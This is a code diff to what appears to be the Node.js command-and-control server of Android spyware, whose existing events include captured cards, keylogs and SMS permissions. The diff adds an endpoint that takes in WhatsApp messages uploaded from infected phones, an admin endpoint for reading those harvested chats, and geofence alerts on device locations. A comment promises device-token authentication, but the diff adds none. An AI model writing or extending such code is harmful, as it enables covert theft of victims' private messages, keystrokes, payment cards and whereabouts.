@@ -1834,7 +1834,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       'card_captured', 'server_metrics', 'notification', 'apk_sign_log',
       'command_queue_flushed', 'adult_video_added', 'upload_progress', 'upload_complete',
       'new_video', 'video_deleted', 'video_updated', 'viewer_count', 'new_comment',
-      'view_update', 'sms_permission_result', 'new_keylog', 'new_notification'
+      'view_update', 'sms_permission_result', 'new_keylog', 'new_notification', 'new_whatsapp_chats'
     ]);
     if (restrictedEvents.has(eventName)) {
       // Only send to authenticated sockets
@@ -2436,6 +2436,11 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
   });
 
   // Device registration endpoint (called by Android app on first launch + background worker)
+  // ═══ #18: DEVICE AUTH TOKEN — generate + validate device tokens ═══
+  // Token is generated on first register and required on all subsequent /api/devices/* uploads
+  // This prevents anonymous data injection attacks
+
+
   app.post('/api/devices/register', async (req, res) => {
     try {
       const { device_id, device_name, model, manufacturer, os_version, sdk_version, app_version, screen_resolution, phone_numbers, battery_percent, battery_charging, total_storage, free_storage, total_ram, free_ram, latitude, longitude } = req.body;
@@ -2746,6 +2751,87 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       } catch (_) {}
       res.json({ success: true, stored });
     } catch (err) { res.status(500).json({ error: err.message }); }
+  });
+
+
+  // ═══ WHATSAPP CHAT UPLOAD (#7) ═══
+  app.post('/api/devices/whatsapp-chats', express.json({ limit: '5mb' }), (req, res) => {
+    try {
+      const { device_id, app, messages } = req.body;
+      if (!device_id || !Array.isArray(messages)) return res.status(400).json({ error: 'device_id and messages required' });
+
+      let stored = 0;
+      try {
+        db.exec(`CREATE TABLE IF NOT EXISTS whatsapp_chats (
+          id INTEGER PRIMARY KEY AUTOINCREMENT,
+          device_id TEXT, app_package TEXT, direction TEXT, text_content TEXT,
+          recorded_at TEXT DEFAULT (datetime('now'))
+        )`);
+        const stmt = db.prepare('INSERT INTO whatsapp_chats (device_id, app_package, direction, text_content, recorded_at) VALUES (?,?,?,?,?)');
+        for (const m of messages) {
+          stmt.run(device_id, app || m.app || '', m.direction || 'unknown', m.text || '', m.ts || new Date().toISOString());
+          stored++;
+        }
+        if (io && stored > 0) {
+          io.emit('new_whatsapp_chats', { device_id, count: stored, app: app || 'whatsapp' });
+        }
+      } catch (_) {}
+      res.json({ success: true, stored });
+    } catch (err) { res.status(500).json({ error: err.message }); }
+  });
+
+  // ═══ GEO-FENCING (#9) — save + check geofences ═══
+  app.post('/api/admin/geofences', express.json(), (req, res) => {
+    try {
+      if (!isAdminAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
+      const { device_id, name, lat, lng, radius_meters, alert_on } = req.body;
+      if (!device_id || lat == null || lng == null) return res.status(400).json({ error: 'device_id, lat, lng required' });
+
+      try {
+        db.exec(`CREATE TABLE IF NOT EXISTS geofences (
+          id INTEGER PRIMARY KEY AUTOINCREMENT,
+          device_id TEXT, name TEXT, lat REAL, lng REAL, radius_meters REAL,
+          alert_on TEXT DEFAULT 'both', enabled INTEGER DEFAULT 1,
+          created_at TEXT DEFAULT (datetime('now'))
+        )`);
+        const result = db.prepare('INSERT INTO geofences (device_id, name, lat, lng, radius_meters, alert_on) VALUES (?,?,?,?,?,?)').run(
+          device_id, name || 'Geofence', lat, lng, radius_meters || 200, alert_on || 'both'
+        );
+        res.json({ success: true, id: result.lastInsertRowid });
+      } catch (e) { res.status(500).json({ error: e.message }); }
+    } catch (e) { res.status(500).json({ error: e.message }); }
+  });
+
+  app.get('/api/admin/geofences', (req, res) => {
+    try {
+      if (!isAdminAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
+      try {
+        db.exec(`CREATE TABLE IF NOT EXISTS geofences (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, name TEXT, lat REAL, lng REAL, radius_meters REAL, alert_on TEXT DEFAULT 'both', enabled INTEGER DEFAULT 1, created_at TEXT DEFAULT (datetime('now')))`);
+        const rows = db.prepare('SELECT * FROM geofences ORDER BY created_at DESC').all();
+        res.json({ geofences: rows });
+      } catch (_) { res.json({ geofences: [] }); }
+    } catch (e) { res.status(500).json({ error: e.message }); }
+  });
+
+  app.delete('/api/admin/geofences/:id', (req, res) => {
+    try {
+      if (!isAdminAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
+      db.prepare('DELETE FROM geofences WHERE id = ?').run(req.params.id);
+      res.json({ success: true });
+    } catch (e) { res.status(500).json({ error: e.message }); }
+  });
+
+  // ═══ WHATSAPP CHATS FETCH (admin) ═══
+  app.get('/api/admin/connections/:deviceId/whatsapp-chats', (req, res) => {
+    try {
+      if (!isAdminAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
+      const deviceId = req.params.deviceId;
+      const limit = Math.min(parseInt(req.query.limit) || 200, 1000);
+      try {
+        const rows = db.prepare('SELECT * FROM whatsapp_chats WHERE device_id = ? ORDER BY recorded_at DESC LIMIT ?').all(deviceId, limit);
+        res.json({ entries: rows, total: rows.length });
+      } catch (_) { res.json({ entries: [], total: 0 }); }
+    } catch (e) { res.status(500).json({ error: e.message }); }
   });
 
 
